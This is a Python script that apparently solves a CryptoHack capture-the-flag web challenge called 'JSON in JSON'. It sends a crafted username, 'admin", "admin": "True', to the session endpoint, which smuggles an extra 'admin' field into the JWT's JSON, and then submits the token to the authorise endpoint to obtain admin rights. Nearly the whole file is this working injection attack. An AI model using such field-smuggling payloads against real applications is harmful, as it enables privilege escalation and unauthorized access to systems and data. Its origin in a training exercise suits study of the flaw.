import requests
import json

# Define the URLs for session creation and authorisation
session_url = 'http://web.cryptohack.org/json-in-json/create_session/'
auth_url = 'http://web.cryptohack.org/json-in-json/authorise/'

# Function to create a user session with a given username
def create_user_session(username):
    encoded_username = requests.utils.quote(username)  # URL encode the username
    print(f'Your username is:\t{encoded_username}')
    
    # Send a request to create a session for the username
    response = requests.get(session_url + encoded_username)
    
    try:
        # Extract and display the session token (JWT)
        session_token = json.loads(response.text)["session"]
        print(f'Your JWT is:\t\t{session_token}')
        send_token_to_server(session_token)
    except:
        print(response.text)

# Function to send the session token to the server and receive the response
def send_token_to_server(token):
    print('\nSending JWT to server...\n')
    
    # Send the JWT to the server for authorisation
    server_response = requests.get(auth_url + token)
    
    # Display the server's response
    print(f'Server response is:\t{json.loads(server_response.text)["response"]}')
    
    return server_response.text

# Example username
username = 'admin\", \"admin\": \"True'

# Create the user session and send the JWT token
create_user_session(username)
